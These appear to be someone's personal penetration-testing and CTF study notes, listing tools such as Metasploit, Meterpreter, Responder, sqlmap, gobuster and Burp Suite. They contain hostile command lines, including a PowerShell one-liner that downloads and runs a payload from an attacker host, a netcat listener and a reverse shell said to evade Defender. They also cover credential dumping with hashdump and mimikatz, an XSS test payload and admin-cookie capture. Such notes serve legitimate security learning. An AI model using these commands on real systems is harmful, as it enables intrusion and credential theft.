tactics
	using burp suite to repeat an http request to get a backup shell

notes

POWERSHELL
	locations
		C:\Windows\System32\WindowsPowerShell\
		C:\Users\<USERNAME>\Documents\WindowsPowerShell\
		profiles live in here
		looks like you can use a profile to have powershell run commands on startup
		i think we can completely break powershell this way
		maybe we can stick a user in a PSDrive without anything in it
	setting execution policy can be done through registry
	https://ss64.com/ps/
	can use [IPAddress] to typecast something to an IP Address type
		there a bunch more of these types of objects that powershell has, like email

NC
	nc -lvnp 1337
		start a listener on port 1337 with some options

RDP
	remmina

METASPLOIT
	post/multi/recon/local_exploit_suggester
	exploit/multi/handler

MSFVENOM
	generate payload file in multiple different formats to interact with metasploit

METERPRETER
	sysinfo
	getprivs
	background
	shell
	migrate
	getuid
	load kiwi
		mimikatz
	hashdump
	https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
		meterpreter presistence

SMB COMMANDS
	smbclient \\\\<IP ADDRESS>\\<SHARE> -U <USERNAME>
		put moves a file from the local box to the remote one
	smbmap
	sudo mount -t cifs //<IP ADDRESS>/<SHARE NAME> /mnt/smb
		mount smb share

HTTP server
	python -m SimpleHTTPServer 80
		starts an http server in the current directory
	IEX(New-Object Net.WebClient).DownloadString("http://<IP>:<PORT>/<PAYLOAD>") | powershell -noprofile -

RESPONDER
	start by just typing responder
	this attempts to capture the hash of a user that tried to auth to the attack box
		one example is trying to get an sql server to exec a dirtree command on a folder on the attack box

SEARCHSPLOIT
	searches for exploits
	usage: searchsploit <KEYPHRASE>

IMPACKET
	impacket-smbserver
		impacket-smbserver files `pwd`
			sets up an smb server on the attack box with a share named files in the pwd

BLOODHOUND

REVERSE SHELL
	https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
		this needs to be compiled
		defender should have issues detecting this
		need to change host ip and port in the TcpClient part

LINPEAS
	linux enumeration tool

GOBUSTER/DIRBUSTER
	gobuster dir -u <TARGET URL> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o ./gobuster_out.txt
	/usr/share/dirbuster/wordlists
	-e print full URLs in console
	-U and -P for basic auth
	-p <X> proxy utilization
	-c <HTTP COOKIES> use cookie

BURP
	https://www.youtube.com/watch?v=G3hpAeoZ4ek
		basic tutorial
	www.dvwa.co.uk
		for testing burp
		can also change security level
	setup as proxy
	proxy window used for manipulating HTTP requests and stuff
	set target in target>scope tab to tell burp which requests to grab
		proxy>options tab, intercept client requests, and url is in target scope
	in proxy>intercept tab, you can right click on a request and send to different tabs
		also "change request method" option to change between GET and POST
	proxy>optoins, match and replace, can emulate different kinds of devices
	repeater tab - send a request a bunch of times, and modify a request
		ctrl+space hotkey to send request
		encode to different formats, can encode requests to url
		can also encode as you type
	comparer tab - can compare different things to find differences
		useful if you're sifting through a lot of data
		compare by words highlights words that are different
	decoder tab
		encodes and decodes between different formats
	if looking for flags in HTML or GET requests
		use burp, go to the pages, and then go to HTTP history in the proxy menu
		much easier to search through each page this way for flags
	can use a sniper attack for the intruder when trying to figure out what files can be uploaded
		get burp to intercept a request to upload the file, and then send that request to intruder
		then set a wordlist in the payload options to the extensions to try
		also ensure you set the ip and ports correctly for the attack

XSS
	https://youtu.be/HbzI3ubOos0
	sublime on kali
	payload all the things
	start by entering html tags, see what happens
		<h1></h1>, <code></code>, <script>alert(1)</script>
	DOMPurify - does sanitization
	python - import requests for interacting with websites
	capture admin cookie usually

SQL
	sqlmap
		does sql injection
		get a request to an sql injectable location on a website and send it to burp's repeater
		put a * where you can do sql injection
		save that request as a .req file
		do sqlmap -r <FILENAME>.req
		can take a while so do other things while its running
	http://pentestmonkey.net/category/cheat-sheet/sql-injection
		this also has a php reverse shell
		can also just google sql injection with backend database
	/usr/share/wordlists/wfuzz/Injections
		I guess wfuzz can also do sql injections

SQL cmd line
	select * from session_privs;
	select * from user_role_privs;

NIKTO
	nikto -h "<URL>"
		can also | tee nikto.log
